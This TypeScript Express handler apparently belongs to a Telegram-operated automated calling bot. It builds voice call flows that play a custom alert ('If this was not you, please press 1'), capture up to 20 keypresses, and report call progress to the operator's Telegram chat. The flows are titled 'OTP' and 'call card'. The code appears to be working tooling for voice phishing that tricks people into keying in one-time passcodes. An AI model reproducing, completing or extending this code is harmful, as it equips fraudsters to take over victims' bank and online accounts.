import { Response } from 'express';
import { v4 as uuidv4 } from 'uuid';
import { bot } from '..';

export const customDtmfFlow = async (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  destination: string,
  actions: string,
  customMessage: string,
): Promise<Response> => {
  if (dtmf) {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
  }

  const ac: {
    0: string;
    1: string;
  }[] = JSON.parse(actions);

  if (dtmf && (dtmf === '1' || dtmf === '2')) {
    return res.json({
      id: uuidv4(),
      title: `custom - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: ac[0][1],
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: 'customStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${
              process.env.ENDPOINT_URL
            }/custom/${step}/${chatId}/${language}?actions=${JSON.stringify(
              ac.splice(1, 2),
            )}&action=${ac[0][0]}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call card - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `${customMessage}. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          action: 'hangup',
        },
        {
          id: 'customStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}?actions=${actions}&customMessage=${customMessage}`,
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call card - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: '',
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          action: 'hangup',
        },
        {
          id: 'customStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${
              process.env.ENDPOINT_URL
            }/custom/${step}/${chatId}/${language}?actions=${JSON.stringify(
              ac.splice(1, 2),
            )}&action=${ac[0][0]}`,
          },
        },
      ],
    });
  }
};
